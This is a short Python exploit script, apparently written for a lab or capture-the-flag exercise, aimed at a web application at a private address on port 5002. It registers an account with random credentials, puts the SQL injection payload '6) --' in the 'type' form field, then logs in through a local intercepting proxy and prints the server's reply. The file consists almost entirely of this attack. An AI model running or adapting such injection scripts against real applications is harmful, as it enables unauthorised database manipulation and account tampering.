#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re

#ip = sys.argv[1]
ip = '192.168.0.100'

s = requests.Session()

proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

username = generator()
password = generator()



def register_user(s,payload):
    data = {
        'login' : username,
        'type' : payload,
        'password' : password,
        'form' : 'submit'

    }
    html = s.post('http://{}:5002/register'.format(ip),data=data)
    return s

def login_user(s):
    data = {
        'login': username,
        'password': password,
        'form': 'submit'
    }
    html = s.post('http://{}:5002/login'.format(ip), data=data, proxies=proxies)
    print(html.text)
    return s


register_user(s,"6) --")
login_user(s)